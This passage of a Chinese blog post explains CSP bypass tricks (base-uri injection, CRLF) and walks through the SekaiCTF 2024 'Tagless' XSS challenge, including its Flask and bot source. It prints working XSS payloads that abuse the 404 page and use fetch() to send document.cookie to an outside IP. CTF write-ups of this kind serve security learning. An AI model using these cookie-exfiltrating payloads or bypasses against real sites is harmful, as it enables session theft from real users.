+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">base</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;//47.100.223.173/&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#39;test&#39;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;app.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样在<code>&lt;body&gt;</code>中还是能加载到app.js？辩证看待吧。并且需要注意的是，应该是解析顺序的原因，这里需要要利用的<code>&lt;script&gt;</code>标签是在<code>&lt;base&gt;</code>标签下面。</p>
+<p><strong>对于base-uri</strong>，如下解释文章：</p>
+<p>《<a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/base-uri"  target="_blank" rel="noopener"
+    >CSP: base-uri</a>》</p>
+<p>里面提到了一个很有意思的点：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502141543485.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>default-src，也就是前面提到的，当我们并没有显式地定义一个指令，那么此时就会直接回落这个default-src定义的内容。这个是非常重要的利用点。</p>
+<p>除了base-uri，还有其他如form-action、frame-ancestors等指令。</p>
+<p>所以这个方法的利用条件：</p>
+<ul>
+<li>能在<code>&lt;head&gt;</code>中插入<code>&lt;base&gt;</code>标签</li>
+<li>能执行的<code>&lt;script&gt;</code>标签一定至少满足<code>script-src</code>中的一个条件</li>
+<li>没有显式设置base-uri</li>
+<li>页面引用存在相对路径的<code>&lt;script&gt;</code>标签</li>
+</ul>
+<p>RCTF的CSP限制如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;nonce-720f7efdee4d8940dc71ef5190d6f266&#39;; frame-src https://www.google.com/recaptcha/; style-src &#39;self&#39; &#39;unsafe-inline&#39; fonts.googleapis.com; font-src fonts.gstatic.com; img-src &#39;self&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时可以用 <a class="link" href="https://csp-evaluator.withgoogle.com/"  target="_blank" rel="noopener"
+    >CSP Evaluator</a> 网站简单检测一下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502141719910.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250214171904774"
+	
+	
+></p>
+<p>可以打base-uri，具体的原理其实就是前面说的，在标题处插入<code>&lt;base&gt;</code>，然后通过加载js文件来打。</p>
+<p>这道题的wp如下文章比较详细：</p>
+<p><a class="link" href="https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup"  target="_blank" rel="noopener"
+    >https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup</a></p>
+<h6 id="crlf绕过">CRLF绕过
+</h6><p>HCTF2018的一道题，当一个页面存在CRLF漏洞时，并且可控点在CSP上方，那么就可以通过换行，将CSP挤到HTTP返回体中，这样来绕过CSP。</p>
+<p>这里主要的利用手法是，前面说了的，如果是使用<code>&lt;meta&gt;</code>标签，需要在<code>&lt;head&gt;</code>中来定义，并且在<code>&lt;body&gt;</code>中的CSP设置是会被忽略的。</p>
+<p>具体利用就网上搜wp看吧。</p>
+<p>题目地址：https://github.com/Lou00/HCTF2018_Bottle，但是有点老了，docker拉不起来，没搭环境复现。</p>
+<p>————————</p>
+<p>等还有很多绕过方式，这里就不多说了，具体可以看参考文章中的先知社区的文章，还是比较全面的。</p>
+<h3 id="例题分享">例题分享
+</h3><h4 id="tagless">Tagless
+</h4><p>SekaiCTF 2024 的题，题目环境：https://github.com/project-sekai-ctf/sekaictf-2024?tab=readme-ov-file</p>
+<p>——————</p>
+<p>开题如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152047744.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250215204705682"
+	
+	
+></p>
+<p>无标签显示器，尝试往里面插入标签，没有显示。看了一下插入位置，是在<code>&lt;body&gt;</code>中。给docker源代码，直接开审。感觉是一个XSS。</p>
+<p>ap.py文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">request</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bot</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">,</span> <span class="n">static_folder</span><span class="o">=</span><span class="s1">&#39;static&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.after_request</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_security_headers</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;script-src &#39;self&#39;; style-src &#39;self&#39; https://fonts.googleapis.com https://unpkg.com &#39;unsafe-inline&#39;; font-src https://fonts.gstatic.com;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/report&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">report</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bot</span> <span class="o">=</span> <span class="n">Bot</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">parsed_url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid URL.&#34;</span><span class="p">},</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">parsed_url</span><span class="o">.</span><span class="n">scheme</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;http&#34;</span><span class="p">,</span> <span class="s2">&#34;https&#34;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid scheme.&#34;</span><span class="p">},</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">parsed_url</span><span class="o">.</span><span class="n">hostname</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;localhost&#34;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid host.&#34;</span><span class="p">},</span> <span class="mi">401</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">bot</span><span class="o">.</span><span class="n">visit</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bot</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;visited&#34;</span><span class="p">:</span> <span class="n">url</span><span class="p">},</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;URL parameter is missing!&#34;</span><span class="p">},</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">page_not_found</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">path</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> not found&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到这里有设置csp限制，先拿去<a class="link" href="https://csp-evaluator.withgoogle.com/"  target="_blank" rel="noopener"
+    >CSP评估网站</a>评估一下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152113839.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250215211345757"
+	
+	
+></p>
+<p>一个object-src，控制插件的一个指令，但是这里用不了。继续审，在report路由，可以发现是一个让bot来访问的操作。看一下bot.py文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">selenium.webdriver.chrome.options</span> <span class="kn">import</span> <span class="n">Options</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Bot</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--headless&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--disable-gpu&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--no-sandbox&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--disable-dev-shm-usage&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--disable-extensions&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--window-size=1920x1080&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">chrome_options</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">visit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://127.0.0.1:5000/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">add_cookie</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;flag&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;value&#34;</span><span class="p">:</span> <span class="s2">&#34;SEKAI</span><span class="si">{dummy}</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;httponly&#34;</span><span class="p">:</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">refresh</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Visited </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">close</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到在其中的visit()访问时，是带上了flag的，并且将httponly设置为了false，同时需要注意，这里可以看出来是使用的Google引擎。</p>
+<p>那么基本思路就是获取cookie，现在就是看怎么进行利用。</p>
+<p>看一下前端处理渲染的app.js代码，其中看到了一个过滤函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">sanitizeInput</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">str</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;.*&gt;/igm</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;\.*&gt;/igm</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;.*&gt;.*&lt;\/.*&gt;/igm</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>贪婪匹配，替换为空，基本上过滤完了，但是看出来都是匹配的整个<code>&lt;&gt;</code>标签，这里可以使用<code>&lt;img&gt;</code>标签来进行引入，让其自动匹配<code>&gt;</code>（注意这里要看懂app.js的渲染才好懂）：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152256517.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250215225639352"
+	
+	
+></p>
+<p>看此时的前端，可以发现应是浏览器自动补足了缺失的<code>&lt;/body&gt;</code>标签：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152257544.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250215225736494"
+	
+	
+></p>
+<p>但是暂时利用不了，继续看。注意看app.py文件中的404处理过程：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">page_not_found</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">path</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> not found&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>处理404页面时，会直接在将路径打印在页面上？</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152140130.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250215214036075"
+	
+	
+></p>
+<p>确实会，那么在这里就可以插入任意的js标签，比如：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152144535.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250215214455486"
+	
+	
+></p>
+<p>确实解析了，但是并没有执行js解析。此时看到控制台报错：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152324061.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250215232412993"
+	
+	
+></p>
+<p>这个是被CSP限制了，这里才注意到源代码中的CSP的设置是全部路由：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.after_request</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_security_headers</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;script-src &#39;self&#39;; style-src &#39;self&#39; https://fonts.googleapis.com https://unpkg.com &#39;unsafe-inline&#39;; font-src https://fonts.gstatic.com;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>前面忘了，以为是只有index才能。</p>
+<p>所以需要绕一下这个csp，看了一下别人的wp，这里的绕过方法非常精妙呀，这里利用的是<code>&lt;script&gt;</code>标签的src属性，当我们指定src后，引入js文件时就会拼接上路径然后访问，比如</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;/1.js&#34;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么引入的文件时发送的请求是<code>http://hostname/1.js</code>，参考文章：https://blog.csdn.net/festone000/article/details/112030241 。</p>
+<p>那么在这里，我们就额可以尝试来构造一下404页面，从而来绕过，但是需要注意的是，有脏数据，比如我们指定访问<code>/alert(1)</code>文件，那么此时的“文件”内容为：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152340598.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250215234007543"
+	
+	
+></p>
+<p>想要这里的代码正确，需要绕一下。比如前面的<code>/</code>，我们就可以加一个<code>**/</code>来构造多行注释的效果，然后后面的就使用<code>//</code>来单行注释掉即可，最后成功弹窗：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152343430.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250215234308349"
+	
+	
+></p>
+<p>哇，原来src引入的js文件，如果是本地文件，那么同样是拼接到url上去访问获取内容的，有意思有意思。</p>
+<p>那么现在就可以尝试获取cookie，无httponly，直接外带：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">%</span><span class="mi">20</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;/**/fetch(`http://47.100.223.173:2333?cookie=${document.cookie}`)//&#34;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>本地试了一下，edge、firefox和google都能解析，但是就是打不通只能改payload了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;/**/fetch(&#39;http://47.100.223.173:2333/&#39;+document.cookie)//&#34;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后传参：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502160110903.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250216011047819"
+	
+	
+></p>
+<p>这个就打出来了：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502160110795.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250216011011337"
+	
+	
+></p>
+<p>服了，又在这个细节点卡了很久。</p>
+<h4 id="display">display
+</h4><p>N1CTF Junior 2025的题，具体看我另一篇文章：</p>
+<p><a class="link" href="https://fupanc-w1n.github.io/p/n1ctf-junior-2025/#display"  target="_blank" rel="noopener"
+    >https://fupanc-w1n.github.io/p/n1ctf-junior-2025/#display</a></p>
+<p>参考wp：</p>
+<p><a class="link" href="https://hackmd.io/@Whale120/HJ_rpvujC"  target="_blank" rel="noopener"
+    >https://hackmd.io/@Whale120/HJ_rpvujC</a></p>
+<p><a class="link" href="https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/"  target="_blank" rel="noopener"
+    >https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/</a></p>
+<p><a class="link" href="https://www.justus.pw/writeups/sekai-ctf/tagless.html"  target="_blank" rel="noopener"
+    >https://www.justus.pw/writeups/sekai-ctf/tagless.html</a></p>
+<p>知识点参考文章：</p>
+<p><a class="link" href="https://www.cnblogs.com/kinyoobi/p/15341248.html"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/kinyoobi/p/15341248.html</a></p>
+<p><a class="link" href="https://juejin.cn/post/7426954121309356042#heading-5"  target="_blank" rel="noopener"
+    >https://juejin.cn/post/7426954121309356042#heading-5</a></p>
+<p><a class="link" href="https://xz.aliyun.com/news/4716"  target="_blank" rel="noopener"
